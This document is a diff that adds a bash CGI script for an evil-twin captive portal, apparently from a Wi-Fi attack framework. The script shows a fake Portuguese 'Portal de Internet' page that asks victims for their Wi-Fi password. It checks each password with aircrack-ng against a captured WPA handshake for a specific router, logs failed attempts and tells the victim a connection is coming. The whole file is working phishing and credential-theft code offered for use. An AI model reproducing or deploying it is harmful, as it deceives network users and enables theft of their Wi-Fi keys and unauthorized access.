@@ -1,0 +1,55 @@
+#!/usr/bin/env bash
+echo '<!DOCTYPE html>'
+echo '<html>'
+echo -e '\t<head>'
+echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
+echo -e '\t\t<title>Portal de Internet</title>'
+echo -e '\t\t<link rel="stylesheet" type="text/css" href="portal.css"/>'
+echo -e '\t\t<script type="text/javascript" src="portal.js"></script>'
+echo -e '\t</head>'
+echo -e '\t<body>'
+echo -e '\t\t<div class="content">'
+echo -e '\t\t\t<center><p>'
+POST_DATA=$(cat /dev/stdin)
+if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ "${CONTENT_LENGTH}" -gt 0 ]]; then
+POST_DATA=${POST_DATA#*=}
+password=${POST_DATA/+/ }
+password=${password//[*&\/?<>]}
+password=$(printf '%b' "${password//%/\\x}")
+password=${password//[*&\/?<>]}
+fi
+
+if [[ "${#password}" -ge 8 ]] && [[ "${#password}" -le 63 ]]; then
+rm -rf "/tmp/www/ag.et_currentpass.txt" > /dev/null 2>&1
+echo "${password}" >\
+"/tmp/www/ag.et_currentpass.txt"
+aircrack-ng -a 2 -b C4:04:15:1D:C1:FC -w "/tmp/www/ag.et_currentpass.txt" "/opt/wef/main/captures/MOVISTAR_45B0_EXT/2023-06-26-21-04-58-capture-01.cap" | grep "KEY FOUND!" > /dev/null
+if [ "$?" = "0" ]; then
+touch "/tmp/www/ag.et_success.txt" > /dev/null 2>&1
+echo 'A senha está correta, a conexão será estabelecida em alguns momentos'
+et_successful=1
+else
+echo "${password}" >>\
+"/tmp/www/ag.et_attempts.txt"
+echo 'A senha está incorreta, redirecionando para a pagina principal'
+et_successful=0
+fi
+elif [[ "${#password}" -gt 0 ]] && [[ "${#password}" -lt 8 ]]; then
+echo 'Erro. A senha deve ter no mínimo 8 caracteres. Redirecionando para a pagina principal'
+et_successful=0
+else
+echo 'Ocorreu um erro inesperado, redirecionando para a pagina principal'
+et_successful=0
+fi
+echo -e '\t\t\t</p></center>'
+echo -e '\t\t</div>'
+echo -e '\t</body>'
+echo '</html>'
+if [ "${et_successful}" -eq 1 ]; then
+exit 0
+else
+echo '<script type="text/javascript">'
+echo -e '\tsetTimeout("redirect()", 3500);'
+echo '</script>'
+exit 1
+fi
